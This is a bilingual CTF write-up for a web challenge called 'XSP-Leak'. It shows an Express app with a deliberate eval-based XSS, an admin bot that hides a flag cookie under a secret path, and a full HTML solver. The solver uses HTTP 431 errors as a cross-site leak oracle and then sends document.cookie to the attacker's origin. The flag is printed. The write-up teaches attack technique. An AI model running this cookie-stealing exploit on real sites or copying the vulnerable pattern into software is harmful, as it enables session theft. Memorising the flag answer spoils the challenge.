# XSP-Leak

- [日本語(Japanese)](#日本語japanese)
- [English](#english)

## 日本語(Japanese)

- 作問者: Ark
- 想定難易度: Medium-Hard
- カテゴリ: Web
- キーワード: XS-Leak, HTTP 431 error

### 問題文

Cross-Site Path Leak 🤔

- Challenge: `http://{web.host}:{web.port}`
- Admin bot: `http://{bot.host}:{bot.port}`

### 概要

クライアント問です。

問題のソースコードは以下の通りで非常にシンプルで、自明なXSSがあります。

`web/index.js`:
```javascript
import express from "express";

const html = `
<h1>XSS Playground</h1>
<script>eval(new URLSearchParams(location.search).get("xss"));</script>
`;

express()
  .use("/", (req, res, next) => {
    res.setHeader(
      "Content-Security-Policy",
      [
        "script-src 'unsafe-inline' 'unsafe-eval'",
        "default-src 'none'",
        "base-uri 'none'",
        "frame-ancestors 'none'",
        "sandbox allow-scripts allow-same-origin",
      ].join("; ")
    );
    next();
  })
  .get("/{*any}", (req, res) => res.type("html").send(html))
  .all("/{*any}", (req, res) => res.socket.destroy())
  .use((err, req, res, next) => res.socket.destroy())
  .listen(3000);
```

botの実装は以下のとおりです。

`bot/conf.js`:
```javascript
export const visit = async (url) => {
  console.log(`start: ${url}`);

  const secrets = crypto.randomBytes(8).toString("hex").split("");
  // console.log(`secrets: ${secrets}`);

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--js-flags=--noexpose_wasm,--jitless",
      "--disable-features=HttpsFirstBalancedModeAutoEnable",
    ],
  });
  const context = await browser.createBrowserContext();

  // Set cookies
  for (let i = 0; i < secrets.length; i++) {
    const path = "/" + secrets.slice(0, i + 1).join("/");
    await context.setCookie({
      name: String(i),
      value: "true",
      domain: challenge.appUrl.hostname,
      path,
      httpOnly: true, // !!
    });
  }

  // The goal is to steal the following `path` :)
  const path = "/" + secrets.join("/");
  await context.setCookie({
    name: "FLAG",
    value: flag.value,
    domain: challenge.appUrl.hostname,
    path,
    httpOnly: false,
  });

  try {
    const page = await context.newPage();
    await page.goto(url, { timeout: 3_000 });
    await sleep(20_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

以下のようにしてCookieがセットされます:

- Cookies with HttpOnly:
    - `0=true; Domain=web; Path=/d; HttpOnly`
    - `1=true; Domain=web; Path=/d/e; HttpOnly`
    - `2=true; Domain=web; Path=/d/e/a; HttpOnly`
    - `3=true; Domain=web; Path=/d/e/a/d; HttpOnly`
    - ...
    - `15=true; Domain=web; Path=/d/e/a/d/b/e/a/f/1/3/3/7/0/1/2/3; HttpOnly`
- A flag cookie:
    - `FLAG=ICC{...}; Domain=web; Path=/d/e/a/d/b/e/a/f/1/3/3/7/0/1/2/3`

この問題のゴールはpath属性の値をリークして、最終的にフラグのcookieの値を奪取することです。

### 解法

431 errorを発生させるヘッダ長（request-lineを含む）の境界値を特定して、特定のURLパスにアクセス時のエラーの発生有無でオラクルを構築します。

ソルバは以下のとおりです。
高速化のために、`postMessage`や二分探索を使っています。

```html
<body>
  <script type="module">
    const BASE_URL = "http://web:3000";

    const CHARS = "0123456789abcdef".split("");
    const LENGTH = 16;

    const known = [];
    const win = open("");

    const debug = (data) =>
      navigator.sendBeacon("/debug", JSON.stringify(data));

    const getUrl = (prefix, padLength, xss) =>
      `${BASE_URL}/${prefix.join("/")}?${new URLSearchParams({
        xss,
        pad: "x".repeat(padLength),
      })}`;

    const got431 = (prefix, padLength) => {
      const xss = 'opener.postMessage("ping", "*");';
      return new Promise((resolve) => {
        window.onmessage = ({ data }) => {
          if (data === "ping") resolve(false);
        };
        setTimeout(() => resolve(true), 150);
        win.location = getUrl(prefix, padLength, xss);
      });
    };

    let left = 0;
    let right = 18000;
    const getThreshold = async () => {
      left -= 30;

      while (right - left > 2) {
        const mid = (right + left) >> 1;
        if (await got431([...known, "_"], mid)) {
          right = mid;
        } else {
          left = mid;
        }
      }

      return left;
    };

    while (known.length < LENGTH) {
      const threshold = await getThreshold();
      debug({ length: known.length, threshold });
      for (const c of CHARS) {
        if (await got431([...known, c], threshold)) {
          known.push(c);
          debug(known);
          break;
        }
      }
    }

    const url = getUrl(
      known,
      0,
      `location = "${location.origin}/flag?" + document.cookie`
    );
    win.location = url;
  </script>
</body>
```

### フラグ

```
ICC{XssOnly_C0oki3}
```

## English

- Author: Ark
- Estimated Difficulty: Medium-Hard
- Category: Web
- Keywords: XS-Leak, HTTP 431 error

### Challenge Description

Cross-Site Path Leak 🤔

- Challenge: `http://{web.host}:{web.port}`
- Admin bot: `http://{bot.host}:{bot.port}`

### Overview

This is a client-side challenge.

The challenge source code is very simple and has an obvious XSS vulnerability.

`web/index.js`:
```javascript
import express from "express";

const html = `
<h1>XSS Playground</h1>
<script>eval(new URLSearchParams(location.search).get("xss"));</script>
`;

express()
  .use("/", (req, res, next) => {
    res.setHeader(
      "Content-Security-Policy",
      [
        "script-src 'unsafe-inline' 'unsafe-eval'",
        "default-src 'none'",
        "base-uri 'none'",
        "frame-ancestors 'none'",
        "sandbox allow-scripts allow-same-origin",
      ].join("; ")
    );
    next();
  })
  .get("/{*any}", (req, res) => res.type("html").send(html))
  .all("/{*any}", (req, res) => res.socket.destroy())
  .use((err, req, res, next) => res.socket.destroy())
  .listen(3000);
```

The bot implementation is as follows.

`bot/conf.js`:
```javascript
export const visit = async (url) => {
  console.log(`start: ${url}`);

  const secrets = crypto.randomBytes(8).toString("hex").split("");
  // console.log(`secrets: ${secrets}`);

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--js-flags=--noexpose_wasm,--jitless",
      "--disable-features=HttpsFirstBalancedModeAutoEnable",
    ],
  });
  const context = await browser.createBrowserContext();

  // Set cookies
  for (let i = 0; i < secrets.length; i++) {
    const path = "/" + secrets.slice(0, i + 1).join("/");
    await context.setCookie({
      name: String(i),
      value: "true",
      domain: challenge.appUrl.hostname,
      path,
      httpOnly: true, // !!
    });
  }

  // The goal is to steal the following `path` :)
  const path = "/" + secrets.join("/");
  await context.setCookie({
    name: "FLAG",
    value: flag.value,
    domain: challenge.appUrl.hostname,
    path,
    httpOnly: false,
  });

  try {
    const page = await context.newPage();
    await page.goto(url, { timeout: 3_000 });
    await sleep(20_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

Cookies are set as follows:

- Cookies with HttpOnly:
    - `0=true; Domain=web; Path=/d; HttpOnly`
    - `1=true; Domain=web; Path=/d/e; HttpOnly`
    - `2=true; Domain=web; Path=/d/e/a; HttpOnly`
    - `3=true; Domain=web; Path=/d/e/a/d; HttpOnly`
    - ...
    - `15=true; Domain=web; Path=/d/e/a/d/b/e/a/f/1/3/3/7/0/1/2/3; HttpOnly`
- A flag cookie:
    - `FLAG=ICC{...}; Domain=web; Path=/d/e/a/d/b/e/a/f/1/3/3/7/0/1/2/3`

The goal of this challenge is to leak the values of the Path attributes and finally steal the flag cookie's value.

### Solution

We first determine the threshold for triggering an HTTP 431 error based on the total header length (including request-line). Then we construct an oracle by checking whether an error occurs when accessing specific URL paths.

My solver is as follows. To speed up the exploit, it uses `postMessage` and a binary search.

```html
<body>
  <script type="module">
    const BASE_URL = "http://web:3000";

    const CHARS = "0123456789abcdef".split("");
    const LENGTH = 16;

    const known = [];
    const win = open("");

    const debug = (data) =>
      navigator.sendBeacon("/debug", JSON.stringify(data));

    const getUrl = (prefix, padLength, xss) =>
      `${BASE_URL}/${prefix.join("/")}?${new URLSearchParams({
        xss,
        pad: "x".repeat(padLength),
      })}`;

    const got431 = (prefix, padLength) => {
      const xss = 'opener.postMessage("ping", "*");';
      return new Promise((resolve) => {
        window.onmessage = ({ data }) => {
          if (data === "ping") resolve(false);
        };
        setTimeout(() => resolve(true), 150);
        win.location = getUrl(prefix, padLength, xss);
      });
    };

    let left = 0;
    let right = 18000;
    const getThreshold = async () => {
      left -= 30;

      while (right - left > 2) {
        const mid = (right + left) >> 1;
        if (await got431([...known, "_"], mid)) {
          right = mid;
        } else {
          left = mid;
        }
      }

      return left;
    };

    while (known.length < LENGTH) {
      const threshold = await getThreshold();
      debug({ length: known.length, threshold });
      for (const c of CHARS) {
        if (await got431([...known, c], threshold)) {
          known.push(c);
          debug(known);
          break;
        }
      }
    }

    const url = getUrl(
      known,
      0,
      `location = "${location.origin}/flag?" + document.cookie`
    );
    win.location = url;
  </script>
</body>
```

### Flag

```
ICC{XssOnly_C0oki3}
```
